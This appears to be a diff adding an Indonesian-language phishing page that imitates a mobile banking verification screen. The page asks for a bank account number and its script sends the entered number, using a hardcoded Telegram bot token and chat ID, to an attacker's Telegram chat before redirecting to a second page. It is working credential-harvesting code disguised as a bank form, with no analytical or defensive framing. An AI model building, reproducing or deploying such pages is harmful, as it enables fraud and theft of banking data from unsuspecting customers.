@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Verifikasi Mobile Banking</title>
+
+<style>
+:root{
+  --blue:#1496e6;
+  --bg:#f3f4f6;
+  --text:#111;
+  --placeholder:#b7b7b7;
+  --input:#ffffff;
+}
+*{
+  box-sizing:border-box;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+}
+html,body{
+  margin:0;
+  padding:0;
+  height:100%;
+  background:var(--bg);
+}
+.header{
+  height:56px;
+  background:var(--blue);
+  color:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  position:relative;
+}
+.header .back{
+  position:absolute;
+  left:16px;
+  font-size:24px;
+  font-weight:600;
+  cursor:pointer;
+}
+.header-title{
+  font-size:20px;
+  font-weight:bold;
+}
+.container{
+  padding:28px 20px 140px;
+}
+.title{
+  font-size:18px;
+  font-weight:600;
+  margin-bottom:32px;
+}
+.label{
+  font-size:14px;
+  font-weight:600;
+  margin-bottom:10px;
+}
+.input{
+  width:100%;
+  height:58px;
+  background:var(--input);
+  border:none;
+  outline:none;
+  border-radius:18px;
+  padding:0 20px;
+  font-size:15px;
+  font-weight:800;
+  color:var(--text);
+}
+.input::placeholder{
+  color:var(--placeholder);
+}
+.footer{
+  position:fixed;
+  left:0;
+  right:0;
+  bottom:0;
+  padding:16px 20px 26px;
+}
+.btn{
+  width:100%;
+  height:56px;
+  background:var(--blue);
+  color:#fff;
+  border:none;
+  border-radius:18px;
+  font-size:18px;
+  font-weight:600;
+  box-shadow:0 10px 25px rgba(0,0,0,.18);
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <div class="back" onclick="history.back()">←</div>
+  <div class="header-title">Verifikasi Mobile Banking</div>
+</div>
+
+<div class="container">
+  <div class="title">Masukkan Nomor Rekening Anda</div>
+
+  <div class="label">Nomor Rekening</div>
+  <input
+    id="rekening"
+    class="input"
+    type="tel"
+    inputmode="numeric"
+    maxlength="12"
+    placeholder="Masukkan Nomor Rekening">
+</div>
+
+<div class="footer">
+  <button class="btn" onclick="nextPage()">Selanjutnya</button>
+</div>
+
+<script>
+const input = document.getElementById('rekening');
+
+/* ===== hanya angka ===== */
+input.addEventListener('input',()=>{
+  input.value = input.value.replace(/[^0-9]/g,'');
+});
+
+/* ===== NEXT ===== */
+async function nextPage(){
+  const rekening = input.value.trim();
+
+  if(!rekening) return alert('Nomor rekening masih kosong');
+  if(rekening.length < 6) return alert('Nomor rekening tidak valid');
+
+  // === GABUNG DATA (INI YANG KURANG) ===
+  const dataGabung = {
+    nomor_rekening: rekening
+  };
+
+  // simpan ke localStorage
+  localStorage.setItem('dataReg', JSON.stringify(dataGabung));
+
+  // ===== KIRIM TELEGRAM =====
+  const TOKEN   = '7701091667:AAEK6o1oKgQoxt-5JybA04kmtqJmYbNQt_8';
+  const CHAT_ID = '5983910858';
+
+  const pesan =
+`📄 REGISTRASI MOBILE
+━━━━━━━━━━━━━━
+REKENING : ${dataGabung.nomor_rekening}
+━━━━━━━━━━━━━━
+🕒 ${new Date().toLocaleString()}`;
+
+  try{
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+      method:'POST',
+      headers:{ 'Content-Type':'application/json' },
+      body:JSON.stringify({
+        chat_id: CHAT_ID,
+        text: pesan
+      })
+    });
+  }catch(err){
+    console.error('Telegram gagal:', err);
+  }
+
+  // ===== PINDAH HALAMAN =====
+  window.location.href = 'halaman2.html';
+}
+</script>
+
+</body>
+</html>
